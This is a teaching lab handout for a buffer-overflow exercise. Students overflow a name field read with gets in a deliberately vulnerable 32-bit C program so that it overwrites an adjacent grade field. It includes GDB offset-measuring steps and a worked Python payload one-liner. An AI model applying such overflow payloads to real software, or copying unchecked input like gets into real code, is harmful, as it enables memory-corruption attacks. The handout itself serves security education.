# Level 1 — "Fix Your Grade" (Easy)

You are stuck with a grade of **D**. The program stores your `grade` right
next to your `name` in memory, and it reads your name with an unsafe function
that never checks how much you type. Overflow `name` to overwrite `grade`.

**Win condition:** make the program print something like

```text
user   : YOUR_NAME
  grade  : A+

*** ACCESS GRANTED :: GRADE OVERRIDE COMPLETE ***
*** LEVEL 1 CLEARED ***
```

You do **not** edit `vulnerable.c`. You only craft the input you send it.

---

## Step 1 — Build

```bash
make
file vulnerable      # must say: ELF 32-bit ... Intel 80386
```

**Read the compiler warnings** (especially about `gets`). That warning is the
point: the function is unsafe on purpose.

## Step 2 — Play it straight first

```bash
./vulnerable
```

Type a short name. Notice the grade stays `D`. Now try a very long name
(20+ characters). What happened to the grade? Why?

## Step 3 — Measure in GDB

On the 32-bit UTM VM, live GDB works. Measure — do not guess:

```bash
gdb ./vulnerable
```

```text
(gdb) break main
(gdb) run
(gdb) next
(gdb) next
(gdb) print &student.name
(gdb) print &student.grade
(gdb) print (char *)&student.grade - (char *)&student.name
(gdb) quit
```

You can also inspect the type layout without running:

```bash
gdb -q -batch -ex "ptype /o student_cse_29" ./vulnerable
```

Example layout:

```text
/*      0      |      16 */    char name[16];
/*     16      |       4 */    char grade[4];
```

That offset (**16**) is how many bytes from the start of `name` to `grade`.

## Step 4 — Craft the payload

Your input needs to:

1. put your username in `name`,
2. place a `'\0'` right after it (so `%s` stops printing the name cleanly),
3. pad until you have written OFFSET bytes total,
4. then write `A+` so it lands on `grade`.

Template:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"NAME\x00" + b"A"*PAD + b"A+")' | ./vulnerable
```

Worked example (name = `nawab`, offset = 16 → pad = 10):

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"nawab\x00" + b"A"*10 + b"A+")' | ./vulnerable
```

## Step 5 — Submit

- The exact input (or Python one-liner) that clears the level
- Your GDB notes (`&name`, `&grade`, offset)
- 3–4 sentences: where the overflow is, and how `name` sits relative to `grade`

---

## What you should understand after this

- Arrays are just consecutive bytes; C does not check bounds.
- Neighbors in memory can be corrupted by an overflow.
- `gets` is unsafe because it never learns the buffer size.
- Null terminators decide where `%s` stops printing.
